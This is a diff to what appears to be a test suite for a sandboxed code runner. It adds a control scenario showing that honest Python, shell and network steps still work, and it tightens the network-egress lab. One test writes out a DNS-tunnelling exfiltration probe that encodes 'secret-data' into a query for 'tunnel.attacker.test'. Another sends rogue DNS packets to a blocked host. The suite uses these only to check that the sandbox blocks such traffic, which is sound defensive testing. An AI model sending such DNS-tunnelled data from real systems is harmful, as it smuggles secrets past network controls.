@@ -105,6 +105,68 @@ class Listener:
         self.sock.close()
 
 
+# ---------------------------------------------------------------------------------------- negative control
+@scenario(
+    "C01",
+    "control",
+    "Honest work still runs (negative control)",
+    attempted="Not an attack. Under the same sandbox: a Python step reads an input CSV and writes JSON, a re-run gives "
+    "the same hash, a shell step uses sort, awk, grep and sed, and a needs_network step fetches https://example.com "
+    "with curl through a name pinned in the hosts file (real TLS, certificates from the skeleton's /etc/ssl).",
+    expected="All of it works. Without this control, 'every attack failed' could just mean 'nothing runs'.",
+)
+def c01(ctx: Ctx):
+    code = """
+import csv, json, os
+rows = list(csv.DictReader(open(os.path.join(os.environ['BRZ_INPUT'], 'sales.csv'))))
+tot = {}
+for r in rows:
+    tot[r['region']] = tot.get(r['region'], 0) + float(r['amount'])
+json.dump(dict(sorted(tot.items())), open(os.path.join(os.environ['BRZ_OUT'], 'summary.json'), 'w'), sort_keys=True)
+print('kernel', os.uname().release, 'uid', os.getuid())
+"""
+    shell = (
+        "printf 'b 2\\na 1\\n' | sort | awk '{print $2}' | grep -v 9 | sed 's/1/one/' > /work/out/s.txt; "
+        "cat /work/out/s.txt; ls /usr/bin/python3 >/dev/null && echo tools-ok"
+    )
+    net = "curl -m 15 -sS -o /dev/null -w 'HTTP %{http_code}' https://example.com"
+    hosts = "/tmp/brz-control.hosts"
+    try:
+        pinned = f"{socket.gethostbyname('example.com')} example.com\n"
+    except OSError as exc:
+        return False, {"harness": f"cannot resolve example.com from the host: {exc}"}
+    with open(hosts, "w") as fh:
+        fh.write(pinned)
+    csv_bytes = b"region,amount\nnorth,10\nsouth,20\nnorth,5\n"
+    with ctx.runner("c01", extra_args=["--hosts-file", hosts]) as r:
+        st1, res1 = r.step(code, step_id="s1", files={"sales.csv": csv_bytes}, expected_outputs=["summary.json"])
+        st2, res2 = r.step(code, step_id="s1b", files={"sales.csv": csv_bytes})
+        st3, res3 = r.step(shell, kind="shell", step_id="s2")
+        st4, res4 = r.step(net, kind="shell", step_id="s3", needs_network=True, timeout_s=30)
+        report = _scan(r)
+    summary = (r.file_bytes(res1, "summary.json") or b"").decode()
+    same = (res1.get("files") or {}).get("summary.json", {}).get("sha256") == (res2.get("files") or {}).get(
+        "summary.json", {}
+    ).get("sha256")
+    good = (
+        res1.get("exit_code") == 0
+        and res1.get("executor") == "gvisor-systrap"
+        and summary == '{"north": 15.0, "south": 20.0}'
+        and same
+        and res3.get("exit_code") == 0
+        and "tools-ok" in str(res3.get("stdout"))
+        and "HTTP 200" in str(res4.get("stdout"))
+        and report.get("clean") is True
+    )
+    return good, {
+        "python": {"exit": res1.get("exit_code"), "stdout": res1.get("stdout"), "summary.json": summary},
+        "rerun_identical": same,
+        "shell": {"exit": res3.get("exit_code"), "stdout": res3.get("stdout"), "stderr": res3.get("stderr")},
+        "needs_network": {"exit": res4.get("exit_code"), "stdout": res4.get("stdout"), "stderr": res4.get("stderr")},
+        "scan_clean": report.get("clean"),
+    }
+
+
 # ---------------------------------------------------------------------------------------- filesystem
 @scenario(
     "A01",
@@ -573,7 +635,7 @@ for path, cap in (('/tmp/fill', 400), ('/work/out/fill', 3072)):
     except OSError as e:
         res[path + ':error'] = e.strerror
     res[path] = n
-print(json.dumps(res), flush=True)
+    print(json.dumps(res), flush=True)
 """
     with ctx.runner("a12") as r:
         status, res = r.step(code, timeout_s=120, http_timeout=170)
@@ -585,7 +647,7 @@ print(json.dumps(res), flush=True)
     inside = json_stdout(res)
     tmp_ok = (inside.get("/tmp/fill") or 0) <= 257
     work_written = max(inside.get("/work/out/fill") or 0, host_size)
-    good = status == 200 and tmp_ok and work_written <= WORK_QUOTA_MIB * 1.1
+    good = status == 200 and inside.get("/tmp/fill") is not None and tmp_ok and work_written <= WORK_QUOTA_MIB * 1.1
     return good, {
         "tmp_mib_written": inside.get("/tmp/fill"),
         "work_mib_on_host": host_size,
@@ -850,14 +912,18 @@ class NetLab:
         self.down()
 
 
+NETLAB_HOSTS = "/tmp/brz-netlab.hosts"
+
+
 def _build_netlab_ruleset(port: int) -> tuple[str, dict]:
     from brz_runner import egress
 
+    with open(NETLAB_HOSTS, "w") as fh:
+        fh.write(egress.hosts_lines({"allowed.test": [NetLab.ALLOWED]}))
     kw = {
         "allowed_ipv4": [NetLab.ALLOWED],
         "control_plane_cidr": f"{NetLab.CONTROL}/32",
         "runner_port": port,
-        "dns_server": NetLab.CONTROL,
     }
     return egress.build_ruleset(**kw), kw
 
@@ -868,6 +934,7 @@ def _netlab_runner_args(ctx: Ctx, port: int) -> dict:
         "connect_host": NetLab.VM,
         "port": port,
         "wrapper": ["nsenter", f"--net=/run/netns/{NetLab.NS}"],
+        "extra_args": ["--hosts-file", NETLAB_HOSTS],
     }
 
 
@@ -906,6 +973,12 @@ try:
     s.sendto(b'rogue-dns', ({lab.DENIED!r}, 53)); res['udp rogue dns'] = 'sent'
 except OSError as e:
     res['udp rogue dns'] = e.strerror
+s = socket.create_connection(('allowed.test', 443), timeout=3)
+res['allowed.test:443'] = 'CONNECTED ' + repr(s.recv(32)); s.close()
+try:
+    res['unpinned name'] = str(socket.getaddrinfo('other.test', 443)[:1])
+except OSError as e:
+    res['unpinned name'] = 'ERR ' + str(e)
 print(json.dumps(res))
 """
         with ctx.runner("a19", **_netlab_runner_args(ctx, port)) as r:
@@ -936,7 +1009,9 @@ print(json.dumps(res))
         status == 200
         and res.get("exit_code") == 0
         and "HELLO-FROM-ALLOWED" in str(inside.get(f"{lab.ALLOWED}:443"))
-        and len(hits["allowed:443"]) == 1
+        and "HELLO-FROM-ALLOWED" in str(inside.get("allowed.test:443"))
+        and str(inside.get("unpinned name")).startswith("ERR")
+        and len(hits["allowed:443"]) == 2
         and not any(v for k, v in hits.items() if k != "allowed:443")
         and from_outsider != "CONNECTED"
         and from_cp == 200
@@ -970,8 +1045,11 @@ import json, socket
 qname = b''.join(bytes([len(p)]) + p for p in b'c2VjcmV0LWRhdGE.tunnel.attacker.test'.split(b'.')) + b'\\0'
 query = b'\\x12\\x34\\x01\\0\\0\\x01\\0\\0\\0\\0\\0\\0' + qname + b'\\0\\x01\\0\\x01'
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-s.sendto(query, ({lab.CONTROL!r}, 53))
-print(json.dumps({{'sent': True}}))
+try:
+    s.sendto(query, ({lab.CONTROL!r}, 53)); out = 'sent'
+except OSError as e:
+    out = e.strerror
+print(json.dumps({{'udp': out}}))
 """
         with ctx.runner("a20", **_netlab_runner_args(ctx, port)) as r:
             status, res = r.step(code, timeout_s=15, needs_network=True)
